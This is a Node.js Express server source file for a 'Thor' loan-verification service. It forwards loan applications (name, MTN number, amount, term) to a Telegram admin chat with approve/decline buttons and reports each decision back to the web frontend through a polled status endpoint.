const express = require('express');
const path = require('path');
const axios = require('axios');
require('dotenv').config();

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.TELEGRAM_ADMIN_CHAT_ID;
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

const loans = {};
let lastUpdateId = 0;

// Prevent HTML injection if a user enters special characters (<, >, &)
function escapeHtml(text) {
    return String(text || '')
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;');
}

// Formats the Telegram message with true bold styling on received details
function buildThorMessage(record, statusLabel, statusUpdatedBadge = null) {
    const lines = [
        '# Thor - Loan Verification',
        '',
        'LOAN APPLICATION RECEIVED',
        '',
        'USER DETAILS:',
        `• Applicant: <b>${escapeHtml(record.fullName)}</b>`,
        `• Phone Number: <b>${escapeHtml(record.mtnNumber)}</b>`,
        '',
        '━━━━━━━━━━━━━━━━━━━━',
        '',
        'LOAN DETAILS:',
        `• Application ID: <b>${escapeHtml(record.id)}</b>`,
        `• Loan Type: <b>${escapeHtml(record.loanService)}</b>`,
        `• Amount: <b>${escapeHtml(record.loanAmount)}</b>`,
        `• Term: <b>${escapeHtml(record.repaymentPeriod)}</b>`,
        '',
        '━━━━━━━━━━━━━━━━━━━━',
        '',
        `STATUS: <b>${escapeHtml(statusLabel)}</b>`
    ];

    if (statusUpdatedBadge) {
        lines.push('');
        lines.push(`Status Updated: ${statusUpdatedBadge}`);
    }

    return lines.join('\n');
}

// 1. Receive Application from public/index.html -> Send to Telegram
app.post('/api/loans/apply', async (req, res) => {
    const { fullName, mtnNumber, loanService, loanAmount, repaymentPeriod } = req.body;

    if (!fullName || !mtnNumber || !loanService || !loanAmount || !repaymentPeriod) {
        return res.status(400).json({ message: 'All loan application fields are required.' });
    }

    const id = 'MOMO-' + Date.now();

    const record = {
        id,
        fullName,
        mtnNumber,
        loanService,
        loanAmount,
        repaymentPeriod,
        status: 'PENDING'
    };

    loans[id] = record;

    const message = buildThorMessage(record, 'Pending');

    try {
        await axios.post(`${TELEGRAM_API}/sendMessage`, {
            chat_id: ADMIN_CHAT_ID,
            text: message,
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [[
                    { text: '✅ Approve', callback_data: `APPROVE:${id}` },
                    { text: '❌ Decline', callback_data: `REJECT:${id}` }
                ]]
            }
        });

        res.json({ applicationId: id, status: 'PENDING' });
    } catch (error) {
        console.error('Telegram API Error:', error.response?.data || error.message);
        res.status(500).json({ message: 'Failed to notify admin on Telegram.' });
    }
});

// 2. Frontend Polls This Endpoint While Spinner Runs
app.get('/api/loans/status/:id', (req, res) => {
    const record = loans[req.params.id];
    if (!record) {
        return res.status(404).json({ status: 'NOT_FOUND' });
    }
    res.json({ status: record.status });
});

// 3. Background Listener for Admin Button Taps in Telegram
async function pollTelegramUpdates() {
    if (!BOT_TOKEN) return;

    try {
        const res = await axios.get(`${TELEGRAM_API}/getUpdates`, {
            params: { offset: lastUpdateId + 1, timeout: 25 }
        });

        for (const update of res.data.result) {
            lastUpdateId = update.update_id;

            if (update.callback_query) {
                const cb = update.callback_query;
                const [decision, id] = cb.data.split(':');
                const isApproved = decision === 'APPROVE';

                if (loans[id]) {
                    loans[id].status = isApproved ? 'APPROVED' : 'REJECTED';
                }

                await axios.post(`${TELEGRAM_API}/answerCallbackQuery`, {
                    callback_query_id: cb.id,
                    text: isApproved ? 'Loan Approved!' : 'Loan Declined!'
                });

                const updatedText = loans[id]
                    ? buildThorMessage(
                          loans[id],
                          isApproved ? 'Approved' : 'Declined',
                          isApproved ? '✅ APPROVED' : '❌ DECLINED'
                      )
                    : `${escapeHtml(cb.message.text)}\n\nSTATUS: <b>${isApproved ? 'Approved' : 'Declined'}</b>\n\nStatus Updated: ${isApproved ? '✅ APPROVED' : '❌ DECLINED'}`;

                await axios.post(`${TELEGRAM_API}/editMessageText`, {
                    chat_id: cb.message.chat.id,
                    message_id: cb.message.message_id,
                    text: updatedText,
                    parse_mode: 'HTML'
                });
            }
        }
    } catch (err) {
        // Retry automatically on temporary network hiccup
    } finally {
        setTimeout(pollTelegramUpdates, 1000);
    }
}

const PORT = process.env.PORT || 3000;
app.listen(PORT, async () => {
    console.log(`Thor Loan Verification Server running at http://localhost:${PORT}`);
    if (BOT_TOKEN) {
        await axios.get(`${TELEGRAM_API}/deleteWebhook`).catch(() => {});
        pollTelegramUpdates();
    }
});

